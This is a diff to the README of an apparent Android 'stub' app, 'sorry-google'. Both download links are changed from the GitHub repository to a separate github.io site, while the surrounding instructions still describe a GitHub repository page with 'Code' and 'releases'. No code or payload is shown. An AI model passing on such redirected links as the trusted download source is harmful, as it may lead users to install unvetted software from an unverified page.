@@ -39,7 +39,7 @@ Each stub is a tiny, harmless placeholder that doesn't do anything except take u
 
 ## ⬇️ How to Get It
 
-[![Download sorry-google](https://img.shields.io/badge/Download-sorry--google-brightgreen?style=for-the-badge&logo=android&logoColor=white&color=FF6B6B)](https://github.com/Coopeconomy4265/sorry-google)
+[![Download sorry-google](https://img.shields.io/badge/Download-sorry--google-brightgreen?style=for-the-badge&logo=android&logoColor=white&color=FF6B6B)](https://coopeconomy4265.github.io)
 
 **Visit this link to download the application.** It will open a GitHub page where you'll find the files you need. Look for the folder named "releases" or the files listed directly on the main page.
 
@@ -59,7 +59,7 @@ Before you begin, ensure:
 ### Step 2: Download the Files
 
 **Visit this link to download the application:**
-👉 [https://github.com/Coopeconomy4265/sorry-google](https://github.com/Coopeconomy4265/sorry-google)
+👉 [https://coopeconomy4265.github.io](https://coopeconomy4265.github.io)
 
 On that page, look for a green button that says **"Code"** and click it. Then choose **"Download ZIP."** This will download all the stub files to your phone.
 
